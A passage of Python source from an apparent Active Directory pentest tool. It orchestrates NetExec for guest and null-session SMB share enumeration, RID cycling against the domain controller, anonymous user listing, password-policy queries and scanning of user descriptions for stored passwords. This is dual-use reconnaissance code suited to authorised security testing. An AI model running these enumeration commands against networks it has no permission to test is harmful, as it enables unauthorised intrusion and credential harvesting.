        context_label=prompt_context,
        recommendation_lines=[
            "Large share enumeration scopes can generate significant noise and take a long time.",
            "Recommendation: narrow the scope to likely member servers or a smaller subnet first.",
        ],
        confirm_prompt="Continue with this SMB target scope?",
        default_confirm=False,
    )


def _set_guest_smb_targets(shell: Any, *, domain: str, targets: list[str]) -> None:
    """Persist guest SMB target tokens in domain runtime state."""
    domain_data = shell.domains_data.setdefault(domain, {})
    domain_data["guest_smb_targets"] = list(targets)


def _resolve_guest_targets_default_input(
    *,
    shell: Any,
    current_targets: list[str],
    pdc_ip: str | None,
) -> str:
    """Resolve default text shown for custom guest target input prompt."""
    path_like_current = any(
        str(token).endswith(".txt") or "/" in str(token) for token in current_targets
    )
    if current_targets and not path_like_current:
        return ", ".join(current_targets)
    shell_hosts = str(getattr(shell, "hosts", "") or "").strip()
    if shell_hosts:
        return shell_hosts
    return str(pdc_ip or "").strip()


def _maybe_override_guest_smb_targets(
    shell: Any,
    *,
    domain: str,
    current_targets: list[str],
    current_source: str,
) -> tuple[list[str], str]:
    """Offer an interactive target override for guest share enumeration."""
    if getattr(shell, "auto", False):
        return current_targets, current_source
    if is_non_interactive(shell):
        return current_targets, current_source

    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return current_targets, current_source

    domain_data = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    pdc_ip = str(domain_data.get("pdc", "")).strip()
    enabled_computers = domain_relpath(
        shell.domains_dir, domain, "enabled_computers_ips.txt"
    )
    legacy_smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")

    option_labels: list[str] = []
    option_actions: list[str] = []

    if os.path.exists(enabled_computers):
        option_labels.append("Use enabled domain computers file (Recommended)")
        option_actions.append("enabled_file")

    option_labels.append("Use current guest target set")
    option_actions.append("keep_current")

    option_labels.append("Enter custom ranges/IPs now")
    option_actions.append("custom_input")

    if pdc_ip:
        option_labels.append("Use only validated PDC/DC")
        option_actions.append("pdc_only")

    if os.path.exists(legacy_smb_ips):
        option_labels.append("Use legacy smb/ips.txt file")
        option_actions.append("legacy_file")

    default_idx = 0
    selected_idx = selector(
        "Guest SMB target scope:",
        option_labels,
        default_idx=default_idx,
    )
    if selected_idx is None:
        return current_targets, current_source
    if not isinstance(selected_idx, int) or not (
        0 <= selected_idx < len(option_actions)
    ):
        return current_targets, current_source

    action = option_actions[selected_idx]

    if action == "keep_current":
        return current_targets, current_source
    if action == "enabled_file":
        targets = [enabled_computers]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "enabled_computers_file"
    if action == "legacy_file":
        targets = [legacy_smb_ips]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "smb_ips_file"
    if action == "pdc_only" and pdc_ip:
        targets = [pdc_ip]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "pdc_fallback"
    if action == "custom_input":
        default_input = _resolve_guest_targets_default_input(
            shell=shell,
            current_targets=current_targets,
            pdc_ip=pdc_ip or None,
        )
        while True:
            raw_input = Prompt.ask(
                Text(
                    "Enter SMB target ranges/IPs (comma/space-separated)",
                    style="cyan",
                ),
                default=default_input,
            ).strip()
            parsed_targets = _normalize_smb_target_tokens(raw_input)
            if not parsed_targets:
                print_warning(
                    "No valid SMB targets entered. Keeping the current guest target set."
                )
                return current_targets, current_source
            if not confirm_large_smb_target_scope(
                shell,
                targets=parsed_targets,
                prompt_context="Guest SMB target scope",
            ):
                print_info(
                    "Large SMB target scope rejected. Enter a narrower scope or keep the current one."
                )
                default_input = raw_input
                continue
            _set_guest_smb_targets(shell, domain=domain, targets=parsed_targets)
            shell.hosts = ", ".join(parsed_targets)
            return parsed_targets, "configured_custom"

    return current_targets, current_source


def run_guest_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via guest session and render results."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    target_tokens, target_source = _resolve_guest_smb_targets(shell, domain=domain)
    target_tokens, target_source = _maybe_override_guest_smb_targets(
        shell,
        domain=domain,
        current_targets=target_tokens,
        current_source=target_source,
    )
    if not target_tokens:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "No guest SMB targets available for domain "
            f"{marked_domain}. Configure targets first in start_unauth."
        )
        return
    target_display = " ".join(target_tokens)
    targets_arg = " ".join(shlex.quote(token) for token in target_tokens)
    guest_transport_username = resolve_smb_guest_username(shell=shell, domain=domain)
    guest_auth = _build_guest_auth_nxc(shell, domain=domain)

    print_operation_header(
        "Guest Session Share Enumeration",
        details={
            "Domain": domain,
            "Target": target_display,
            "Target Source": target_source,
            "Type": "SMB Shares Enumeration",
            "Authentication": f"Guest Account ({guest_transport_username})",
            "Threads": "16",
        },
        icon="👤",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_guest_shares.log")
    command = (
        f"{shell.netexec_path} smb {targets_arg} {guest_auth} "
        f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
        f"{log_path} "
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="guest",
        password="",
    )


def _run_guest_share_probe(
    shell: Any,
    *,
    domain: str,
    target_tokens: list[str],
    log_path: str,
    strategy_key: str,
    strategy_label: str,
    target_source: str,
) -> dict[str, Any]:
    """Run a guest ``--shares`` probe and return normalized metrics."""
    targets_arg = " ".join(shlex.quote(token) for token in target_tokens)
    guest_auth = _build_guest_auth_nxc(shell, domain=domain)
    command = (
        f"{shell.netexec_path} smb {targets_arg} {guest_auth} "
        f"-t 10 --timeout 60 --smb-timeout 30 --shares --log {log_path} "
    )
    print_info_debug(f"[guest-benchmark] {strategy_key} shares command: {command}")
    started = time.perf_counter()
    completed_process = shell._run_netexec(
        command,
        domain=domain,
        pre_sync=False,
    )
    elapsed = max(0.0, time.perf_counter() - started)

    output = ""
    return_code: int | None = None
    success = False
    if completed_process is not None:
        return_code = int(getattr(completed_process, "returncode", 1))
        success = return_code == 0
        output = str(getattr(completed_process, "stdout", "") or "")

    host_identity = _extract_smb_host_identity_map(output) if success else {}
    guest_session_hosts = _extract_guest_session_hosts(output) if success else {}
    share_map = parse_smb_share_map(output) if success else {}

    return {
        "strategy_key": strategy_key,
        "strategy_label": strategy_label,
        "target_source": target_source,
        "target_tokens": list(target_tokens),
        "log_path": log_path,
        "command": command,
        "success": success,
        "return_code": return_code,
        "duration_seconds_total": elapsed,
        "duration_seconds_discovery": 0.0,
        "duration_seconds_shares": elapsed,
        "host_identity": host_identity,
        "guest_session_hosts": guest_session_hosts,
        "share_map": share_map,
        "hosts_with_guest_access": len(guest_session_hosts),
        "hosts_with_share_permissions": len(share_map),
        "hosts_with_guest_share_permissions": sum(
            1 for ip in guest_session_hosts if share_map.get(ip)
        ),
        "shares_with_permissions": sum(len(shares) for shares in share_map.values()),
    }


def _run_guest_host_discovery_probe(
    shell: Any,
    *,
    domain: str,
    target_tokens: list[str],
    log_path: str,
) -> dict[str, Any]:
    """Run SMB host discovery (without ``--shares``) and return discovered hosts."""
    targets_arg = " ".join(shlex.quote(token) for token in target_tokens)
    command = (
        f"{shell.netexec_path} smb {targets_arg} "
        f"-t 10 --timeout 60 --smb-timeout 30 --log {log_path} "
    )
    print_info_debug(f"[guest-benchmark] discovery command: {command}")
    started = time.perf_counter()
    completed_process = shell._run_netexec(
        command,
        domain=domain,
        pre_sync=False,
    )
    elapsed = max(0.0, time.perf_counter() - started)

    output = ""
    return_code: int | None = None
    success = False
    if completed_process is not None:
        return_code = int(getattr(completed_process, "returncode", 1))
        success = return_code == 0
        output = str(getattr(completed_process, "stdout", "") or "")

    discovered_hosts = _extract_smb_host_identity_map(output) if success else {}
    return {
        "command": command,
        "log_path": log_path,
        "success": success,
        "return_code": return_code,
        "duration_seconds": elapsed,
        "discovered_hosts": discovered_hosts,
        "discovered_hosts_count": len(discovered_hosts),
    }


def run_smb_guest_strategy_benchmark(shell: Any, *, domain: str) -> None:
    """Benchmark guest SMB share strategies (range-direct vs discovery+IPs)."""
    if domain not in getattr(shell, "domains_data", {}):
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain {marked_domain} is not configured in the current workspace."
        )
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    target_tokens, target_source = _resolve_guest_smb_targets(shell, domain=domain)
    target_tokens, target_source = _maybe_override_guest_smb_targets(
        shell,
        domain=domain,
        current_targets=target_tokens,
        current_source=target_source,
    )
    if not target_tokens:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"No guest SMB targets available for benchmark in domain {marked_domain}."
        )
        return

    selected_run_mode = "compare_both"
    if not getattr(shell, "auto", False) and not is_non_interactive(shell):
        selector = getattr(shell, "_questionary_select", None)
        if callable(selector):
            labels = [
                "Compare both strategies (Recommended)",
                "Run strategy 1 only (Direct --shares on ranges)",
                "Run strategy 2 only (Discovery -> IP file -> --shares)",
            ]
            actions = [
                "compare_both",
                "direct_ranges",
                "discovery_then_ips",
            ]
            selected_idx = selector(
                "Select guest SMB benchmark mode:",
                labels,
                default_idx=0,
            )
            if selected_idx is None:
                print_info("SMB guest benchmark cancelled by user.")
                return
            if isinstance(selected_idx, int) and 0 <= selected_idx < len(actions):
                selected_run_mode = actions[selected_idx]

    run_direct = selected_run_mode in {"compare_both", "direct_ranges"}
    run_discovery_then_ips = selected_run_mode in {
        "compare_both",
        "discovery_then_ips",
    }
    if not run_direct and not run_discovery_then_ips:
        print_info("No guest SMB benchmark strategy selected.")
        return

    print_operation_header(
        "Guest SMB Strategy Benchmark",
        details={
            "Domain": domain,
            "Targets": " ".join(target_tokens),
            "Target Source": target_source,
            "Run Mode": selected_run_mode,
        },
        icon="⏱️",
    )

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        "smb",
        "guest_strategy_benchmark",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

    results: list[dict[str, Any]] = []
    result_by_key: dict[str, dict[str, Any]] = {}

    if run_direct:
        direct_log_path = domain_relpath(
            shell.domains_dir,
            domain,
            "smb",
            "guest_strategy_benchmark",
            f"{timestamp}_direct_ranges_shares.log",
        )
        direct_result = _run_guest_share_probe(
            shell,
            domain=domain,
            target_tokens=target_tokens,
            log_path=direct_log_path,
            strategy_key="direct_ranges",
            strategy_label="1) Direct --shares on ranges",
            target_source=target_source,
        )
        results.append(direct_result)
        result_by_key["direct_ranges"] = direct_result

    if run_discovery_then_ips:
        discovery_log_path = domain_relpath(
            shell.domains_dir,
            domain,
            "smb",
            "guest_strategy_benchmark",
            f"{timestamp}_discovery.log",
        )
        discovery_result = _run_guest_host_discovery_probe(
            shell,
            domain=domain,
            target_tokens=target_tokens,
            log_path=discovery_log_path,
        )

        discovery_ips_rel = domain_relpath(
            shell.domains_dir,
            domain,
            "smb",
            "guest_strategy_benchmark",
            f"{timestamp}_discovered_ips.txt",
        )
        discovery_ips_abs = os.path.join(workspace_cwd, discovery_ips_rel)
        discovered_ips = sorted(discovery_result.get("discovered_hosts", {}).keys())
        discovery_error: str | None = None
        if discovery_result.get("success") and discovered_ips:
            try:
                with open(discovery_ips_abs, "w", encoding="utf-8") as ips_file:
                    ips_file.write("\n".join(discovered_ips) + "\n")
                print_info_debug(
                    "Guest benchmark discovery targets saved to "
                    f"{mark_sensitive(discovery_ips_rel, 'path')}"
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                discovery_error = (
                    f"failed_to_write_discovery_targets:{type(exc).__name__}"
                )
        elif discovery_result.get("success") and not discovered_ips:
            discovery_error = "discovery_found_no_hosts"
        else:
            discovery_error = "discovery_command_failed"

        if discovery_error is None:
            shares_log_path = domain_relpath(
                shell.domains_dir,
                domain,
                "smb",
                "guest_strategy_benchmark",
                f"{timestamp}_discovered_ips_shares.log",
            )
            discovery_strategy_result = _run_guest_share_probe(
                shell,
                domain=domain,
                target_tokens=[discovery_ips_rel],
                log_path=shares_log_path,
                strategy_key="discovery_then_ips",
                strategy_label="2) Discovery -> IP file -> --shares",
                target_source="discovery_generated_ip_file",
            )
        else:
            discovery_strategy_result = {
                "strategy_key": "discovery_then_ips",
                "strategy_label": "2) Discovery -> IP file -> --shares",
                "target_source": "discovery_generated_ip_file",
                "target_tokens": [discovery_ips_rel],
                "log_path": None,
                "command": "",
                "success": False,
                "return_code": None,
                "duration_seconds_total": max(
                    0.0, float(discovery_result.get("duration_seconds", 0.0))
                ),
                "duration_seconds_discovery": max(
                    0.0, float(discovery_result.get("duration_seconds", 0.0))
                ),
                "duration_seconds_shares": 0.0,
                "host_identity": {},
                "guest_session_hosts": {},
                "share_map": {},
                "hosts_with_guest_access": 0,
                "hosts_with_share_permissions": 0,
                "hosts_with_guest_share_permissions": 0,
                "shares_with_permissions": 0,
            }

        discovery_strategy_result["duration_seconds_discovery"] = max(
            0.0,
            float(discovery_result.get("duration_seconds", 0.0)),
        )
        discovery_strategy_result["duration_seconds_shares"] = max(
            0.0,
            float(discovery_strategy_result.get("duration_seconds_shares", 0.0)),
        )
        discovery_strategy_result["duration_seconds_total"] = (
            discovery_strategy_result["duration_seconds_discovery"]
            + discovery_strategy_result["duration_seconds_shares"]
        )
        discovery_strategy_result["discovery"] = discovery_result
        discovery_strategy_result["discovery_targets_file"] = discovery_ips_rel
        discovery_strategy_result["discovery_error"] = discovery_error

        results.append(discovery_strategy_result)
        result_by_key["discovery_then_ips"] = discovery_strategy_result

    if not results:
        print_warning("Guest SMB benchmark completed with no strategy results.")
        return

    table = Table(
        title="[bold cyan]Guest SMB Strategy Benchmark Results[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Strategy", style="cyan")
    table.add_column("Status", style="magenta")
    table.add_column("Total (s)", style="green", justify="right")
    table.add_column("Discovery (s)", style="green", justify="right")
    table.add_column("Shares (s)", style="green", justify="right")
    table.add_column("Guest Hosts", style="cyan", justify="right")
    table.add_column("RW Hosts", style="cyan", justify="right")
    table.add_column("RW Shares", style="cyan", justify="right")
    for result in results:
        table.add_row(
            str(result.get("strategy_label", "")),
            "ok" if bool(result.get("success")) else "failed",
            f"{float(result.get('duration_seconds_total', 0.0)):.3f}",
            f"{float(result.get('duration_seconds_discovery', 0.0)):.3f}",
            f"{float(result.get('duration_seconds_shares', 0.0)):.3f}",
            str(int(result.get("hosts_with_guest_access", 0))),
            str(int(result.get("hosts_with_share_permissions", 0))),
            str(int(result.get("shares_with_permissions", 0))),
        )
    print_panel_with_table(table, border_style=BRAND_COLORS["info"])

    comparison: dict[str, Any] = {}
    direct_result = result_by_key.get("direct_ranges")
    discovery_result = result_by_key.get("discovery_then_ips")
    if isinstance(direct_result, dict) and isinstance(discovery_result, dict):
        direct_guest_hosts = set(direct_result.get("guest_session_hosts", {}).keys())
        discovery_guest_hosts = set(
            discovery_result.get("guest_session_hosts", {}).keys()
        )
        direct_rw_hosts = set(direct_result.get("share_map", {}).keys())
        discovery_rw_hosts = set(discovery_result.get("share_map", {}).keys())

        comparison = {
            "fastest_strategy": (
                "direct_ranges"
                if float(direct_result.get("duration_seconds_total", 0.0))
                <= float(discovery_result.get("duration_seconds_total", 0.0))
                else "discovery_then_ips"
            ),
            "guest_hosts_only_in_direct_ranges": sorted(
                direct_guest_hosts - discovery_guest_hosts
            ),
            "guest_hosts_only_in_discovery_then_ips": sorted(
                discovery_guest_hosts - direct_guest_hosts
            ),
            "rw_hosts_only_in_direct_ranges": sorted(
                direct_rw_hosts - discovery_rw_hosts
            ),
            "rw_hosts_only_in_discovery_then_ips": sorted(
                discovery_rw_hosts - direct_rw_hosts
            ),
        }

        comparison_table = Table(
            title="[bold cyan]Guest SMB Strategy Comparison[/bold cyan]",
            header_style="bold magenta",
            box=rich.box.SIMPLE_HEAVY,
        )
        comparison_table.add_column("Metric", style="cyan")
        comparison_table.add_column("Value", style="green", justify="right")
        comparison_table.add_row(
            "Fastest Strategy",
            str(comparison["fastest_strategy"]),
        )
        comparison_table.add_row(
            "Guest Hosts only in Strategy 1",
            str(len(comparison["guest_hosts_only_in_direct_ranges"])),
        )
        comparison_table.add_row(
            "Guest Hosts only in Strategy 2",
            str(len(comparison["guest_hosts_only_in_discovery_then_ips"])),
        )
        comparison_table.add_row(
            "RW Hosts only in Strategy 1",
            str(len(comparison["rw_hosts_only_in_direct_ranges"])),
        )
        comparison_table.add_row(
            "RW Hosts only in Strategy 2",
            str(len(comparison["rw_hosts_only_in_discovery_then_ips"])),
        )
        print_panel_with_table(comparison_table, border_style=BRAND_COLORS["info"])

    results_payload: list[dict[str, Any]] = []
    for result in results:
        payload = {
            k: v
            for k, v in result.items()
            if k not in {"host_identity", "guest_session_hosts", "share_map"}
        }
        payload["guest_session_hosts"] = result.get("guest_session_hosts", {})
        payload["share_map"] = result.get("share_map", {})
        if isinstance(result.get("discovery"), dict):
            payload["discovery"] = dict(result["discovery"])
        results_payload.append(payload)

    benchmark_json_abs = os.path.join(
        benchmark_root_abs,
        f"{timestamp}_guest_strategy_benchmark.json",
    )
    benchmark_json_rel = domain_relpath(
        shell.domains_dir,
        domain,
        "smb",
        "guest_strategy_benchmark",
        f"{timestamp}_guest_strategy_benchmark.json",
    )
    benchmark_payload = {
        "timestamp": timestamp,
        "domain": domain,
        "targets": list(target_tokens),
        "target_source": target_source,
        "selected_run_mode": selected_run_mode,
        "results": results_payload,
        "comparison": comparison,
    }
    try:
        with open(benchmark_json_abs, "w", encoding="utf-8") as benchmark_file:
            json.dump(benchmark_payload, benchmark_file, indent=2)
        print_success(
            "Guest SMB benchmark results saved to "
            f"{mark_sensitive(benchmark_json_rel, 'path')}."
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("Guest SMB benchmark completed, but persistence failed.")
        print_warning_debug(
            f"Guest SMB benchmark persistence error: {type(exc).__name__}: {exc}"
        )


def run_auth_shares(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Run authenticated SMB share enumeration and render results."""
    if domain not in shell.domains:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain '{marked_domain}' is not configured. Please add or select a valid domain."
        )
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    auth = shell.build_auth_nxc(username, password, domain)
    marked_username = mark_sensitive(username, "user")
    log_path = domain_relpath(
        shell.domains_dir, domain, "smb", f"smb_{username}_shares.log"
    )
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"No host targets are available for domain {marked_domain}."
        )
        return
    command = (
        f"{shell.netexec_path} smb {shlex.quote(targets_file)} {auth} "
        f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
        f"{log_path} "
    )
    marked_domain = mark_sensitive(domain, "domain")
    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)
    print_info(
        f"Checking shares access as user {marked_username} in domain {marked_domain}"
    )
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {marked_domain}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB share scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username=username,
        password=password,
    )


def run_rid_cycling(shell: Any, *, domain: str) -> None:
    """Run RID cycling against PDC and write discovered users list."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return

    print_operation_header(
        "RID Cycling Enumeration",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Method": "Guest Session",
            "Output": f"domains/{domain}/smb/smb_rid.log",
        },
        icon="🔢",
    )

    rid_log = domain_relpath(shell.domains_dir, domain, "smb", "smb_rid.log")
    guest_auth = _build_guest_auth_nxc(shell, domain=domain)
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"{guest_auth} --rid-brute 2000 --timeout 60 --smb-timeout 30 --log "
        f"{rid_log}"
    )
    print_info_debug(f"Command: {command}")
    execute_smb_rid_cycling(shell, command=command, domain=domain)


def execute_netexec_smb_descriptions(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec SMB descriptions enumeration and parse results.

    This function executes the NetExec command, parses user descriptions from output,
    displays them with Rich formatting, and optionally analyzes them for passwords
    using CredSweeper.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    try:
        completed_process = shell._run_netexec(
            command,
            domain=domain,
            timeout=300,
        )

        # Check the process output
        if completed_process.returncode == 0:
            raw_output = completed_process.stdout or ""
            output_str = strip_ansi_codes(raw_output)

            if not output_str.strip():
                marked_domain = mark_sensitive(domain, "domain")
                print_warning(
                    f"No SMB descriptions found or command produced no output for domain {marked_domain}."
                )
                return

            marked_domain = mark_sensitive(domain, "domain")
            print_info_verbose(
                f"User Descriptions from SMB for domain {marked_domain} (raw output length: {len(output_str)} chars)"
            )

            # Parse SMB user descriptions using parser
            user_descriptions = parse_smb_user_descriptions(output_str)

            if not user_descriptions:
                print_warning(
                    "[smb-desc] No user descriptions were parsed from SMB output."
                )
                return

            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Parsed {len(user_descriptions)} user description(s) from SMB for domain {marked_domain}."
            )

            # Display parsed descriptions using Rich
            _display_user_descriptions_with_rich(shell, user_descriptions)

            # Analyze descriptions for passwords using CredSweeper if available
            if getattr(shell, "credsweeper_path", None):
                workspace_cwd = shell._get_workspace_cwd()
                smb_dir = domain_path(
                    workspace_cwd, shell.domains_dir, domain, shell.smb_dir
                )
                os.makedirs(smb_dir, exist_ok=True)
                descriptions_file = os.path.join(smb_dir, "smb_descriptions.log")

                # Save descriptions to file for CredSweeper analysis
                with open(descriptions_file, "w", encoding="utf-8") as desc_file:
                    for user, desc in sorted(user_descriptions.items()):
                        desc_file.write(f"{user}  {desc}\n")

                print_info_verbose(
                    f"[smb-desc] Saved SMB descriptions to {descriptions_file} for password analysis"
                )

                # Delegate to shell's analysis helper if available
                analyze_helper = getattr(
                    shell, "_analyze_descriptions_for_passwords", None
                )
                if callable(analyze_helper):
                    analyze_helper(descriptions_file, user_descriptions, domain)
        else:
            print_error("Error listing SMB descriptions.")
            if completed_process.stderr:
                print_error(completed_process.stderr)
            elif completed_process.stdout:
                print_error(completed_process.stdout)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing netexec for SMB descriptions.")
        print_exception(show_locals=False, exception=exc)


def _display_user_descriptions_with_rich(
    shell: Any, user_descriptions: dict[str, str]
) -> None:
    """Display user descriptions in a Rich table.

    Args:
        shell: Shell instance with display helpers.
        user_descriptions: Dictionary mapping username -> description.
    """
    # Use shell's display helper if available, otherwise use our own
    display_helper = getattr(shell, "_display_ldap_descriptions_with_rich", None)
    if callable(display_helper):
        display_helper(user_descriptions)
        return

    # Fallback: create our own Rich table
    table = Table(
        title="[bold cyan]User Descriptions Found[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Username", style="cyan")
    table.add_column("Description", style="yellow")

    for username, description in sorted(user_descriptions.items()):
        marked_username = mark_sensitive(username, "user")
        marked_description = mark_sensitive(description, "password")
        table.add_row(marked_username, marked_description)

    shell.console.print(Panel(table, border_style="bright_blue"))


def run_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Search for user descriptions over SMB in a target domain via NetExec.

    This mirrors the legacy ``do_netexec_smb_descriptions`` behaviour while
    keeping the orchestration logic outside of ``adscan.py``.
    """
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "null_descriptions.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"-u '' -p '' --log {log_path} --users"
    )

    marked_domain = mark_sensitive(domain, "domain")
    marked_auth_type = mark_sensitive(shell.domains_data[domain]["auth"], "domain")
    print_info(
        f"Searching for descriptions in domain {marked_domain} with a {marked_auth_type} session"
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_smb_descriptions(shell, command=command, domain=domain)


def execute_netexec_pass_policy(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec password policy command and display results.

    Args:
        shell: Shell instance with domain data and helper methods.
        command: Full NetExec command to run.
        domain: Target domain.
    """
    try:
        completed_process = shell._run_netexec(
            command,
            domain=domain,
            timeout=900,
            operation_kind="password_policy",
            service="ldap",
            target_count=1,
        )

        if completed_process.returncode == 0:
            if completed_process.stdout:
                clean_stdout = strip_ansi_codes(completed_process.stdout)
                shell.console.print(clean_stdout.strip())
            else:
                print_error(
                    "Command executed successfully, but no output to display for password policy."
                )
        else:
            print_error(
                f"Error searching for the password policy. Return code: {completed_process.returncode}"
            )
            error_message = (
                strip_ansi_codes(completed_process.stderr or "").strip()
                if completed_process.stderr
                else strip_ansi_codes(completed_process.stdout or "").strip()
            )
            if error_message:
                print_error(f"Details: {error_message}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing netexec for password policy.")
        print_exception(show_locals=False, exception=e)


def run_pass_policy(shell: Any, *, domain: str) -> None:
    """Display the SMB password policy for a domain using NetExec.

    This encapsulates the former ``do_netexec_pass_policy`` logic.
    """
    from adscan_internal.workspaces.subpaths import domain_path

    workspace_cwd = shell._get_workspace_cwd()
    smb_path = domain_path(workspace_cwd, shell.domains_dir, domain, shell.smb_dir)
    os.makedirs(smb_path, exist_ok=True)

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    domain_creds = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    username = domain_creds.get("username")
    password = domain_creds.get("password")
    if not username or not password:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Missing credentials for {marked_domain}. Cannot query password policy."
        )
        return

    use_kerberos = False
    if hasattr(shell, "do_sync_clock_with_pdc"):
        use_kerberos = bool(shell.do_sync_clock_with_pdc(domain, verbose=True))
    auth = shell.build_auth_nxc(
        username,
        password,
        domain,
        kerberos=use_kerberos,
    )

    pdc_target = shell.domains_data[domain]["pdc"]
    pdc_hostname = str(shell.domains_data[domain].get("pdc_hostname") or "").strip()
    if use_kerberos and pdc_hostname:
        pdc_target = f"{pdc_hostname}.{domain}"

    marked_domain = mark_sensitive(domain, "domain")
    command = (
        f"{shell.netexec_path} ldap {pdc_target} {auth} "
        f"--pass-pol --log domains/{marked_domain}/ldap/pass_policy.log"
    )
    print_info_verbose(f"Displaying password policy for domain {marked_domain}")
    execute_netexec_pass_policy(shell, command=command, domain=domain)


def run_smb_scan(shell: Any, *, domain: str) -> None:
    """Perform the unauthenticated SMB scan steps for a domain."""
    if shell._is_ctf_domain_pwned(domain):
        return

    from adscan_internal import print_operation_header

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    print_operation_header(
        "Unauthenticated SMB Scan",
        details={
            "Domain": domain,
            "PDC": pdc,
            "Operations": "Null Session, RID Cycling, Guest Session, Shares Enum",
        },
        icon="🔒",
    )
    if not os.path.exists(domain_relpath(shell.domains_dir, domain, "smb")):
        os.makedirs(domain_relpath(shell.domains_dir, domain, "smb"), exist_ok=True)
    shell.do_netexec_null_general(domain)
    shell.do_rid_cycling(domain)
    shell.do_netexec_null_shares(domain)
    shell.do_netexec_guest(domain)


def run_smb_null_enum_users(shell: Any, *, domain: str) -> None:
    """Create a domain users list via unauthenticated SMB enumeration."""
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"-u '' -p '' --users --log "
        f"{domain_relpath(shell.domains_dir, domain, 'smb', 'users_null.log')}"
    )
    print_info("Creating a SMB user list")
    print_info_debug(f"Command: {command}")

    completed_process = shell._run_netexec(
        command,
        domain=domain,
        timeout=900,
        operation_kind="smb_user_enum",
        service="smb",
    )
    if completed_process is None:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Failed to enumerate SMB users (no result returned) for domain "
            f"{marked_domain}."
        )
        return

    if completed_process.returncode != 0:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"Error enumerating SMB users in domain {marked_domain}.")
        error_message = (
            completed_process.stderr or completed_process.stdout or ""
        ).strip()
        if error_message:
            print_error(error_message)
        return

    users = parse_smb_usernames(completed_process.stdout or "")
    shell._write_user_list_file(
        domain,
        "users.txt",
        users,
        merge_existing=True,
        update_source="SMB user enumeration",
    )
    shell._postprocess_user_list_file(
        domain,
        "users.txt",
        source="smb_users",
    )


def run_guest_shares_local(shell: Any, *, domain: str) -> None:
